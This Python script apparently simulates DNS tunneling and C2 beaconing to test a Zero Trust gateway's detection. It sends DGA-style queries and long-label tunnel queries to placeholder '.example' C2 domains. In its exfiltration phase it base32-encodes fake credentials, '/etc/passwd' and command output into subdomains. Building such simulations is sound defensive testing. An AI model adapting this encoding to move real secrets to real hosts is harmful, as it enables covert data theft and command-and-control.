#!/usr/bin/env python3
"""Scenario 5 — DNS tunneling / C2 beaconing simulation via dnspython."""
import base64
import random
import string
import sys
import time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

import dns.resolver
from config import LOGS_DIR
from utils import print_banner, SessionLog
from rich.console import Console

console = Console()

# C2 domains that generate suspicious DNS patterns
C2_DOMAINS = [
    "c2tunnel.example.com",
    "beacon.malware-c2.example.net",
    "update.evil-domain.example.org",
]

def encode_data(data: str) -> str:
    """Simulate data-in-DNS exfil by base64-encoding into subdomain labels."""
    encoded = base64.b32encode(data.encode()).decode().lower().rstrip("=")
    # Split into ≤63-char labels
    return ".".join(encoded[i:i+20] for i in range(0, min(len(encoded), 40), 20))


def random_subdomain(length: int = 16) -> str:
    """Generate algorithmically-looking subdomain (mimics DGA)."""
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choices(chars, k=length))


def run() -> dict:
    print_banner("Scenario 5 — DNS Tunneling / C2 Beaconing",
                 "Fires real DNS queries with C2-like patterns through your resolver")
    log = SessionLog("05_dns_tunnel", LOGS_DIR)

    console.print("[dim]NOTE: For these to appear in Gateway DNS logs, your device must be enrolled in Zero Trust (WARP).[/dim]\n")

    resolver = dns.resolver.Resolver()
    resolver.timeout = 3
    resolver.lifetime = 3

    total = blocked = passed = 0

    # Phase 1: High-frequency DGA-style queries (C2 check-in pattern)
    console.print("[yellow]Phase 1: DGA beaconing — 20 algorithmically-generated subdomains[/yellow]")
    for _ in range(20):
        sub = random_subdomain(random.randint(12, 24))
        fqdn = f"{sub}.{random.choice(C2_DOMAINS)}"
        try:
            resolver.resolve(fqdn, "A")
            console.print(f"  [green]RESOLVED[/green] {fqdn}")
            passed += 1
            log.log("DNS-A", fqdn, 200, sub, "resolved")
        except dns.resolver.NXDOMAIN:
            console.print(f"  [dim]NXDOMAIN[/dim]  {fqdn}")
            passed += 1  # query was made, NXDOMAIN is expected for fake domains
            log.log("DNS-A", fqdn, 404, sub, "NXDOMAIN — query logged")
        except Exception as e:
            console.print(f"  [red]ERROR[/red]     {fqdn} — {e}")
            log.log("DNS-A", fqdn, 0, sub, str(e))
        total += 1
        time.sleep(random.uniform(0.5, 2.0))  # beaconing interval

    # Phase 2: TXT record queries with encoded data (exfil-in-DNS)
    console.print("\n[yellow]Phase 2: Data exfil via DNS — TXT queries with encoded subdomains[/yellow]")
    exfil_samples = ["user=admin;host=portal;token=abc123", "file=/etc/passwd", "cmd=whoami;result=root"]
    for sample in exfil_samples:
        encoded_sub = encode_data(sample)
        fqdn = f"{encoded_sub}.{random.choice(C2_DOMAINS)}"
        try:
            resolver.resolve(fqdn, "TXT")
            console.print(f"  [green]TXT RESOLVED[/green] {fqdn[:60]}...")
            passed += 1
            log.log("DNS-TXT", fqdn, 200, sample, "TXT resolved")
        except Exception:
            console.print(f"  [dim]TXT NXDOMAIN[/dim]  {fqdn[:60]}... (encoded: {sample[:30]})")
            passed += 1
            log.log("DNS-TXT", fqdn, 404, sample, "NXDOMAIN — query logged")
        total += 1
        time.sleep(random.uniform(1.0, 3.0))

    # Phase 3: Long subdomain labels (tunnel data)
    console.print("\n[yellow]Phase 3: Long subdomain labels — mimics dnscat2/iodine tunneling[/yellow]")
    for i in range(10):
        long_sub = random_subdomain(random.randint(40, 60))
        fqdn = f"{long_sub[:60]}.{random.choice(C2_DOMAINS)}"
        try:
            resolver.resolve(fqdn, "A")
        except Exception:
            pass
        console.print(f"  [dim]TUNNEL[/dim] {fqdn[:70]}...")
        log.log("DNS-TUNNEL", fqdn, 0, long_sub, "long-label tunnel query")
        total += 1
        time.sleep(random.uniform(0.3, 1.0))

    log.save()
    return {"scenario": "DNS Tunneling", "total": total, "blocked": blocked, "passed": total,
            "detection": "CF-Gateway-DNSTunnel"}


if __name__ == "__main__":
    run()
